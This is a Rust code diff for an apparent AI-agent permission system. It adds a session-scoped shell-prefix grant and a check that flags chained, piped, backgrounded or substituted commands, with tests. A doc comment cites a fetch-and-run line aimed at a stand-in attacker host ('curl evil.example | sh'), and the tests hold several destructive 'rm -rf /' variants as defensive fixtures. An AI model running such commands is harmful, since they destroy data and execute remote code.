@@ -250,17 +250,34 @@ pub fn contains_shell_metacharacters(command: &str) -> bool {
 /// (what a control character becomes once the real sanitizer has run).
 ///
 /// This is the narrower half of [`contains_shell_metacharacters`] --
-/// deliberately excluding [`SHELL_METACHARACTERS`] itself. See
-/// [`PatternRule::matches_deny`]'s own doc for why: the two callers of this
-/// predicate need different things from it. `matches_deny` needs "was
-/// something erased that would have changed where the tokens fall", which
-/// is exactly what a control character (raw or laundered into the
-/// placeholder) means; it must NOT mean "does this contain `;`", because
-/// `;` doesn't erase anything -- `prefix_matches` sees it exactly as
-/// written, and a command it doesn't align with (`foo; git push` against a
-/// `git push` prefix) is the module's own documented, accepted
-/// prefix-match limit, not a bug this predicate exists to paper over.
-fn rendered_evidence_is_untrustworthy(command: &str) -> bool {
+/// deliberately excluding `SHELL_METACHARACTERS` itself. See
+/// [`PatternRule::matches_deny`]'s own doc for why: the callers of this
+/// predicate need different things from it than a metacharacter scan would
+/// give them. `matches_deny` needs "was something erased that would have
+/// changed where the tokens fall", which is exactly what a control
+/// character (raw or laundered into the placeholder) means; it must NOT
+/// mean "does this contain `;`", because `;` doesn't erase anything --
+/// `prefix_matches` sees it exactly as written, and a command it doesn't
+/// align with (`foo; git push` against a `git push` prefix) is the module's
+/// own documented, accepted prefix-match limit, not a bug this predicate
+/// exists to paper over.
+///
+/// **`pub`, not private (board item `01M38MDGCNVF2GE3JEQTRXSN2S`): reused
+/// verbatim by `conway_runtime::permission::PermissionBroker::
+/// shell_prefix_grant_allows`**, a different crate's ALLOW-side check for
+/// the session-scoped shell-prefix grant (`01M32EBPWZZG6EA77ZG5KYC8KQ`).
+/// That check needs the identical fail-toward-restriction answer this
+/// module's own `matches_deny` already gives for the deny side: `rendered`
+/// carrying a raw control character or the sanitizer's placeholder means
+/// the tokenization cannot be trusted, so a *grant* must decline to cover
+/// the candidate (the deny side, symmetrically, treats the same evidence as
+/// a forced MATCH) -- see that function's own doc for why a second,
+/// hand-rolled scan over the same evidence was rejected in favor of calling
+/// this one directly. See `SHELL_METACHARACTERS`'s own doc for why
+/// `contains_shell_metacharacters` (the WIDER scan) is deliberately not
+/// reused there instead: it would fire on ordinary, non-erasing shell
+/// syntax this module's own honest limit already accepts.
+pub fn rendered_evidence_is_untrustworthy(command: &str) -> bool {
     command
         .chars()
         .any(|c| c.is_control() || c == SANITIZED_CONTROL_PLACEHOLDER)
@@ -455,7 +472,20 @@ impl PatternRule {
 /// with the former. Comparing tokens means the prefix must align with a
 /// real argument boundary, so `git status` covers `git status --short`
 /// but not `git statusfoo` and not `git push`.
-fn prefix_matches(prefix: &str, rendered: &str) -> bool {
+///
+/// `pub` (not `pub(crate)`): board item `01M32EBPWZZG6EA77ZG5KYC8KQ`'s
+/// session-scoped shell-prefix grant lives in `conway-runtime`
+/// (`PermissionBroker`'s own store, alongside `GrantScope` -- see that
+/// module's doc for why), a different crate from this one, and reuses this
+/// EXACT tokenizer rather than a second implementation, so the new grant's
+/// "starts with" cannot silently disagree with what `When::CommandPrefix`
+/// already means everywhere else. This does not reopen the closed door at
+/// [`Rule::gate_allows`]: that gate still refuses every DURABLE allow rule
+/// for a [`RenderKind::ShellCommand`] tool unconditionally, regardless of
+/// what `prefix_matches` says -- exporting the tokenizer only lets a
+/// SEPARATE, in-memory-only, session-scoped mechanism reuse the same
+/// alignment rule, not a new way to install a durable one.
+pub fn prefix_matches(prefix: &str, rendered: &str) -> bool {
     let mut pattern_tokens = prefix.split_whitespace();
     let mut command_tokens = rendered.split_whitespace();
     loop {
@@ -1642,6 +1672,107 @@ pub fn suggested_rule(
     None
 }
 
+/// The default prefix the TUI proposes when the operator opens the
+/// session-scoped shell-prefix grant editor (board item
+/// `01M32EBPWZZG6EA77ZG5KYC8KQ`) over a pending `RenderKind::ShellCommand`
+/// prompt: the first two whitespace-delimited tokens of `rendered`, or the
+/// whole (trimmed) command when it has fewer than two.
+///
+/// **Why two tokens, not one.** A single-token default (`git`, `cargo`)
+/// would admit every subcommand of that program -- `git push --force`,
+/// `git config --global ...`, anything -- from one keystroke, which is
+/// exactly the "clever but broad" default this item's security posture
+/// rules out. Two tokens is the same width the durable mechanism's own
+/// (now-removed) `suggested_rule` offer used for a shell rendering before
+/// board item `01KZDDPC5MMD49F6JPV9CW4TVM` closed that door for the
+/// DURABLE case; reusing the identical width here is a deliberate, no
+/// tighter no looser, choice for the interactive case -- narrow enough
+/// that accepting it verbatim authorizes one program's one subcommand
+/// (plus whatever further arguments follow, `prefix_matches`' own
+/// documented "prefix, not exact match" contract), not the whole program.
+///
+/// **This is only ever a PROPOSAL.** The operator sees this exact string
+/// in the editor and can widen or narrow it before accepting -- this
+/// function has no authority of its own; nothing calls
+/// `PermissionBroker::remember_shell_prefix_grant` with this value
+/// un-reviewed.
+pub fn default_shell_prefix(rendered: &str) -> String {
+    let trimmed = rendered.trim();
+    let mut tokens = trimmed.split_whitespace();
+    match (tokens.next(), tokens.next()) {
+        (Some(first), Some(second)) => format!("{first} {second}"),
+        _ => trimmed.to_string(),
+    }
+}
+
+/// **The compound-command exclusion (board item
+/// `01M32EBPWZZG6EA77ZG5KYC8KQ`, required before the session-scoped
+/// shell-prefix grant could ship): a shell-prefix grant covers ONE simple
+/// command and its arguments; anything that chains, pipes, backgrounds, or
+/// substitutes another command is outside it and prompts.**
+///
+/// `prefix_matches` returns `true` the instant the pattern's own tokens are
+/// exhausted -- it says nothing about what follows them. Left unchecked,
+/// that means a `git status` grant would silently extend to `git status &&
+/// rm -rf /`, `git status; curl evil.example | sh`, `git status
+/// $(rm -rf /)`, and anything else sharing that two-token start: the
+/// operator who reasoned about "let `git status` variants through" would,
+/// without knowing it, have authorized every command on the system behind
+/// that prefix. This is the EXACT defect the durable prefix-pattern grant
+/// was permanently CLOSED for (board item `01KZDDPC5MMD49F6JPV9CW4TVM`) --
+/// inheriting it into a second, interactive mechanism would not be a
+/// smaller version of that defect, it would be the same defect shipped
+/// again.
+///
+/// **This is a SCOPE LIMIT, not a safety scanner, and the distinction is
+/// load-bearing.** This module's own doc (see above) already rules out
+/// judging a shell command's TEXT for danger -- a filter built on pattern
+/// matching over shell syntax fails in both directions, and this project
+/// measured the cost of trying (a 68% false-positive rate) before removing
+/// that approach rather than tightening it. This function does not attempt
+/// that. It asks a narrower, purely STRUCTURAL question that has nothing to
+/// do with what a command might do: does `command` consist of more than
+/// one shell command glued together? A plain redirect (`>out.txt`), an
+/// ordinary variable expansion (`$BRANCH`), a flag containing almost any
+/// other character -- none of that introduces a SECOND command, so none of
+/// it trips this check, no matter how it reads. Only the constructs a shell
+/// actually uses to hand control to another command do:
+///
+/// - **Chaining**: `&&`, `||`, `;`, or a bare newline/carriage return
+///   (a second physical line is a second command).
+/// - **Piping**: `|`.
+/// - **Backgrounding**: `&` (a trailing `&` starts a SECOND, independent
+///   job even though nothing "chains" onto it in the usual sense).
+/// - **Substitution**: `$(...)`/backticks (command substitution) and
+///   `<(...)`/`>(...)` (process substitution) -- each RUNS a command to
+///   produce the text or descriptor the outer command consumes.
+///
+/// Checking for the two-character token `&&`/`||` is redundant with
+/// checking for the bare `&`/`|` it contains -- `contains('&')` already
+/// matches `&&` -- but both are spelled out below anyway so a reader can
+/// map every bullet above to exactly one line of code without having to
+/// notice the redundancy for themselves.
+///
+/// Applied identically to a CANDIDATE call's own rendered text
+/// (`conway_runtime::permission::PermissionBroker::
+/// shell_prefix_grant_allows`) and to a proposed grant's own PREFIX at
+/// install time (`PermissionBroker::remember_shell_prefix_grant`) -- the
+/// same function, the same rule, so the two can never disagree about what
+/// counts as "one simple command."
+pub fn shell_command_is_compound(command: &str) -> bool {
+    command.contains("&&")
+        || command.contains("||")
+        || command.contains(';')
+        || command.contains('|')
+        || command.contains('&')
+        || command.contains('\n')
+        || command.contains('\r')
+        || command.contains("$(")
+        || command.contains('`')
+        || command.contains("<(")
+        || command.contains(">(")
+}
+
 /// The on-disk shape of `.conway/permissions.json`.
 ///
 /// The flat `allow`/`deny` lists of wire-form strings (`"bash:git status"`)
@@ -2297,6 +2428,123 @@ mod store_tests {
         let kind = RenderKind::ShellCommand;
         assert!(suggested_rule("bash", "git status && rm -rf /", kind).is_none());
         assert!(suggested_rule("bash", "git status --short", kind).is_none());
+    }
+
+    // ---- board item `01M32EBPWZZG6EA77ZG5KYC8KQ`: the session-scoped
+    // shell-prefix grant's default proposal ----
+
+    /// The headline default width: two tokens, not one -- narrow enough
+    /// that accepting it verbatim authorizes one subcommand, not the whole
+    /// program (`git`, alone, would admit every subcommand).
+    #[test]
+    fn default_shell_prefix_is_two_tokens_when_the_command_has_at_least_two() {
+        assert_eq!(default_shell_prefix("git status --short"), "git status");
+        assert_eq!(default_shell_prefix("cargo build --release"), "cargo build");
+    }
+
+    /// Fewer than two tokens: the whole (trimmed) command, never padded or
+    /// guessed at.
+    #[test]
+    fn default_shell_prefix_is_the_whole_command_when_shorter_than_two_tokens() {
+        assert_eq!(default_shell_prefix("pwd"), "pwd");
+        assert_eq!(default_shell_prefix("   pwd   "), "pwd");
+        assert_eq!(default_shell_prefix(""), "");
+        assert_eq!(default_shell_prefix("   "), "");
+    }
+
+    /// Repeated internal whitespace collapses -- the default is built from
+    /// `split_whitespace`, the same tokenizer `prefix_matches` itself
+    /// uses, so the two can never disagree about where a token boundary
+    /// falls.
+    #[test]
+    fn default_shell_prefix_collapses_repeated_whitespace() {
+        assert_eq!(
+            default_shell_prefix("git    status   --short"),
+            "git status"
+        );
+    }
+
+    /// The proposed default must itself be something `prefix_matches`
+    /// reports as covering the exact command it was derived from -- an
+    /// offer that could not even match its own source command would be a
+    /// lie on screen.
+    #[test]
+    fn default_shell_prefix_matches_the_command_it_was_derived_from() {
+        for rendered in ["git status --short -uno", "pwd", "cargo test -p conway"] {
+            let prefix = default_shell_prefix(rendered);
+            assert!(
+                prefix_matches(&prefix, rendered),
+                "default prefix {prefix:?} must match its own source command {rendered:?}"
+            );
+        }
+    }
+
+    // ---- board item `01M32EBPWZZG6EA77ZG5KYC8KQ`'s compound-command
+    // exclusion, required before the shell-prefix grant could ship ----
+
+    /// One table, one row per construct named in the item's own acceptance
+    /// list: each one alone must flip `shell_command_is_compound` to
+    /// `true`, proven directly against the function
+    /// `PermissionBroker::shell_prefix_grant_allows`/
+    /// `remember_shell_prefix_grant` both delegate to.
+    #[test]
+    fn shell_command_is_compound_catches_every_named_construct() {
+        let cases: &[(&str, &str)] = &[
+            ("chaining with &&", "git status && rm -rf /"),
+            ("chaining with ||", "git status || rm -rf /"),
+            ("chaining with ;", "git status; rm -rf /"),
+            ("piping with |", "git status | sh"),
+            ("backgrounding with a trailing &", "git status &"),
+            ("an embedded newline", "git status\nrm -rf /"),
+            ("an embedded carriage return", "git status\rrm -rf /"),
+            ("command substitution with $(...)", "git status $(rm -rf /)"),
+            (
+                "command substitution with backticks",
+                "git status `rm -rf /`",
+            ),
+            ("process substitution with <(...)", "git status <(rm -rf /)"),
+            ("process substitution with >(...)", "git status >(rm -rf /)"),
+        ];
+        for (label, command) in cases {
+            assert!(
+                shell_command_is_compound(command),
+                "{label} must be detected as compound: {command:?}"
+            );
+        }
+    }
+
+    /// The ordinary case must NOT be flagged: a plain command plus
+    /// arguments, however many, is exactly what this grant exists to
+    /// cover.
+    #[test]
+    fn shell_command_is_compound_is_false_for_an_ordinary_command() {
+        for command in [
+            "git status --short --branch",
+            "pwd",
+            "cargo test -p conway",
+            "echo hello world",
+        ] {
+            assert!(
+                !shell_command_is_compound(command),
+                "an ordinary single command must not be flagged as compound: {command:?}"
+            );
+        }
+    }
+
+    /// Plain redirection and an ordinary variable expansion do not
+    /// introduce a SECOND command, so neither trips the check -- this is
+    /// what keeps the exclusion a scope limit rather than the removed
+    /// shell-metacharacter safety net (which flagged a bare `$`/`<`/`>`
+    /// too).
+    #[test]
+    fn shell_command_is_compound_does_not_flag_plain_redirects_or_expansions() {
+        for command in ["git log > out.txt", "echo $BRANCH", "cat <input.txt"] {
+            assert!(
+                !shell_command_is_compound(command),
+                "a plain redirect or variable expansion must not be flagged as compound: \
+                 {command:?}"
+            );
+        }
     }
 }
 
